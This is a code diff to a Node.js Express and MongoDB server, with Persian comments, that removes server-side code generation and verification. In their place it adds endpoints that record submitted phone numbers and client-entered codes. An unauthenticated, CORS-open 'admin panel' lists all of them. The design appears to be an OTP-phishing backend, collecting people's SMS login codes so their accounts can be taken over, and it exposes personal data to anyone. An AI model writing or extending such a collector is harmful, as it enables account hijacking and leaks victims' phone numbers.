@@ -7,64 +7,91 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
-mongoose.connect(process.env.MONGO_URL)
+mongoose
+  .connect(process.env.MONGO_URL)
   .then(() => console.log("MongoDB Connected"))
-  .catch(err => console.log(err));
+  .catch((err) => console.log(err));
 
 const UserSchema = new mongoose.Schema({
   phone: String,
   code: String,
-  createdAt: { type: Date, default: Date.now }
+  createdAt: {
+    type: Date,
+    default: Date.now,
+  },
 });
 
 const User = mongoose.model("User", UserSchema);
 
-// ارسال شماره + ساخت کد
+// ثبت شماره
 app.post("/phone", async (req, res) => {
   try {
     const { phone } = req.body;
 
-    const code = Math.floor(1000 + Math.random() * 9000).toString();
+    if (!phone) {
+      return res.status(400).json({
+        error: "phone required",
+      });
+    }
 
     const user = await User.create({
       phone,
-      code
+      code: "",
     });
 
     res.json({
       id: user._id,
-      message: "code_sent"
+      success: true,
     });
-
   } catch (err) {
-    res.status(500).json({ error: err.message });
+    res.status(500).json({
+      error: err.message,
+    });
   }
 });
 
-// چک کردن کد
-app.post("/verify", async (req, res) => {
+// ذخیره کد
+app.put("/code/:id", async (req, res) => {
   try {
-    const { id, code } = req.body;
+    const { id } = req.params;
+    const { code } = req.body;
 
-    const user = await User.findById(id);
+    const user = await User.findByIdAndUpdate(
+      id,
+      { code },
+      { new: true }
+    );
 
-    if (!user) return res.status(404).json({ error: "not found" });
-
-    if (user.code === code) {
-      return res.json({ ok: true });
-    } else {
-      return res.json({ ok: false });
+    if (!user) {
+      return res.status(404).json({
+        error: "user not found",
+      });
     }
 
+    res.json({
+      success: true,
+      user,
+    });
   } catch (err) {
-    res.status(500).json({ error: err.message });
+    res.status(500).json({
+      error: err.message,
+    });
   }
 });
 
-// ادمین
+// پنل ادمین
 app.get("/users", async (req, res) => {
-  const users = await User.find().sort({ createdAt: -1 });
-  res.json(users);
+  try {
+    const users = await User.find().sort({
+      createdAt: -1,
+    });
+
+    res.json(users);
+  } catch (err) {
+    res.status(500).json({
+      error: err.message,
+    });
+  }
 });
 
 app.get("/", (req, res) => {
@@ -72,4 +99,7 @@ app.get("/", (req, res) => {
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log("Server running"));
+
+app.listen(PORT, () => {
+  console.log("Server running on", PORT);
+});
